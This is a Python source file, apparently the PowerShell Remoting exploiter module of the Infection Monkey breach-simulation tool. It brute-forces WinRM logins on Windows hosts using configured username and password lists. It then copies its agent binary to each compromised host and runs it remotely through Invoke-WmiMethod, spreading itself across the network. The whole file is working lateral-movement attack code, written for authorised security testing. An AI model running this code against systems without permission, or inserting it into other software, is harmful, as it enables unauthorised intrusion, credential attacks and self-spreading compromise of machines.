import logging
import os
from typing import Optional, Union

import pypsrp
import spnego
from pypsrp.exceptions import AuthenticationError
from pypsrp.powershell import PowerShell, RunspacePool
from urllib3 import connectionpool

import infection_monkey.monkeyfs as monkeyfs
from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.consts import WIN_ARCH_32, WIN_ARCH_64
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.powershell_utils import utils
from infection_monkey.exploit.powershell_utils.auth_options import (
    AUTH_NEGOTIATE,
    ENCRYPTION_AUTO,
    AuthOptions,
    get_auth_options,
)
from infection_monkey.exploit.powershell_utils.credential_generators import get_credentials
from infection_monkey.exploit.powershell_utils.credentials import Credentials
from infection_monkey.exploit.powershell_utils.utils import (
    IClient,
    get_client_based_on_auth_options,
)
from infection_monkey.exploit.tools.helpers import get_monkey_depth, get_target_monkey_by_os
from infection_monkey.model import GET_ARCH_WINDOWS, VictimHost
from infection_monkey.utils.environment import is_windows_os

LOG = logging.getLogger(__name__)

TEMP_MONKEY_BINARY_FILEPATH = "./monkey_temp_bin"


class PowerShellRemotingDisabledError(Exception):
    pass


class PowerShellExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = "PowerShell Remoting (WinRM)"

    def __init__(self, host: VictimHost):
        PowerShellExploiter._set_sensitive_packages_log_level_to_error()

        super().__init__(host)
        self.client = None

    @staticmethod
    def _set_sensitive_packages_log_level_to_error():
        # If root logger is inherited, extensive and potentially sensitive info could be logged
        sensitive_packages = [pypsrp, spnego, connectionpool]
        for package in sensitive_packages:
            logging.getLogger(package.__name__).setLevel(logging.ERROR)

    def _exploit_host(self):
        try:
            is_https = self._is_client_using_https()
        except PowerShellRemotingDisabledError as e:
            logging.info(e)
            return False

        credentials = get_credentials(
            self._config.exploit_user_list, self._config.exploit_password_list, is_windows_os()
        )
        auth_options = get_auth_options(credentials, is_https)

        self.client = self._authenticate_via_brute_force(credentials, auth_options)
        if not self.client:
            return False

        return self._execute_monkey_agent_on_victim()

    def _is_client_using_https(self) -> bool:
        try:
            logging.debug("Checking if powershell remoting is enabled over HTTP.")
            self._try_http()
            return False
        except AuthenticationError:
            return False
        except Exception as e:
            logging.debug(f"Powershell remoting over HTTP seems disabled: {e}")

        try:
            logging.debug("Checking if powershell remoting is enabled over HTTPS.")
            self._try_https()
            return True
        except AuthenticationError:
            return True
        except Exception as e:
            logging.debug(f"Powershell remoting over HTTPS seems disabled: {e}")
            raise PowerShellRemotingDisabledError("Powershell remoting seems to be disabled.")

    def _try_http(self):
        credentials = Credentials(
            username=self._config.exploit_user_list[0],
            password=self._config.exploit_password_list[0],
        )
        auth_options = AuthOptions(
            auth_type=AUTH_NEGOTIATE,
            encryption=ENCRYPTION_AUTO,
            ssl=False,
        )
        self._authenticate(credentials, auth_options)

    def _try_https(self):
        credentials = Credentials(
            username=self._config.exploit_user_list[0],
            password=self._config.exploit_password_list[0],
        )
        auth_options = AuthOptions(
            auth_type=AUTH_NEGOTIATE,
            encryption=ENCRYPTION_AUTO,
            ssl=True,
        )
        self._authenticate(credentials, auth_options)

    def _authenticate_via_brute_force(
        self, credentials: [Credentials], auth_options: [AuthOptions]
    ) -> Optional[IClient]:
        for (creds, opts) in zip(credentials, auth_options):
            try:
                client = self._authenticate(creds, opts)

                LOG.info(
                    f"Successfully logged into {self.host.ip_addr} using Powershell. User: "
                    f"{creds.username}"
                )
                self.report_login_attempt(True, creds.username, creds.password)

                return client
            except Exception as ex:  # noqa: F841
                LOG.debug(
                    f"Error logging into {self.host.ip_addr} using Powershell. User: "
                    f"{creds.username}, Error: {ex}"
                )
                self.report_login_attempt(False, creds.username, creds.password)

        return None

    def _authenticate(self, credentials: Credentials, auth_options: AuthOptions) -> IClient:
        client = get_client_based_on_auth_options(self.host.ip_addr, credentials, auth_options)

        # attempt to execute dir command to know if authentication was successful
        client.execute_cmd("dir")

        return client

    def _execute_monkey_agent_on_victim(self) -> bool:
        arch = self._get_host_arch()
        self.is_32bit = arch == WIN_ARCH_32

        self._write_virtual_file_to_local_path()

        monkey_path_on_victim = (
            self._config.dropper_target_path_win_32
            if self.is_32bit
            else self._config.dropper_target_path_win_64
        )
        is_monkey_copy_successful = self._copy_monkey_binary_to_victim(monkey_path_on_victim)

        if is_monkey_copy_successful:
            self._run_monkey_executable_on_victim(monkey_path_on_victim)
        else:
            return False

        return True

    def _get_host_arch(self) -> Union[WIN_ARCH_32, WIN_ARCH_64]:
        output = self._execute_cmd_on_host(GET_ARCH_WINDOWS)
        if "64-bit" in output:
            return WIN_ARCH_64
        else:
            return WIN_ARCH_32

    def _execute_cmd_on_host(self, cmd: str) -> str:
        output, _, _ = self.client.execute_cmd(cmd)
        return output

    def _write_virtual_file_to_local_path(self) -> None:
        monkey_fs_path = get_target_monkey_by_os(is_windows=True, is_32bit=self.is_32bit)

        with monkeyfs.open(monkey_fs_path) as monkey_virtual_file:
            with open(TEMP_MONKEY_BINARY_FILEPATH, "wb") as monkey_local_file:
                monkey_local_file.write(monkey_virtual_file.read())

    def _copy_monkey_binary_to_victim(self, dest: str) -> bool:
        LOG.debug(f"Attempting to copy the monkey agent binary to {self.host.ip_addr}")
        try:
            self.client.copy(TEMP_MONKEY_BINARY_FILEPATH, dest)
            LOG.info(f"Successfully copied the monkey agent binary to {self.host.ip_addr}")
            return True
        except Exception as ex:
            LOG.error(f"Failed to copy the monkey agent binary to {self.host.ip_addr}: {ex}")
            return False
        finally:
            os.remove(TEMP_MONKEY_BINARY_FILEPATH)

    def _run_monkey_executable_on_victim(self, executable_path) -> None:
        monkey_execution_command = utils.build_monkey_execution_command(
            self.host, get_monkey_depth() - 1, executable_path
        )

        LOG.debug(
            f"Attempting to execute the monkey agent on remote host "
            f'{self.host.ip_addr} with commmand "{monkey_execution_command}"'
        )
        with self.client.wsman, RunspacePool(self.client.wsman) as pool:
            ps = PowerShell(pool)
            ps.add_cmdlet("Invoke-WmiMethod").add_parameter("path", "win32_process").add_parameter(
                "name", "create"
            ).add_parameter("ArgumentList", monkey_execution_command)
            ps.invoke()
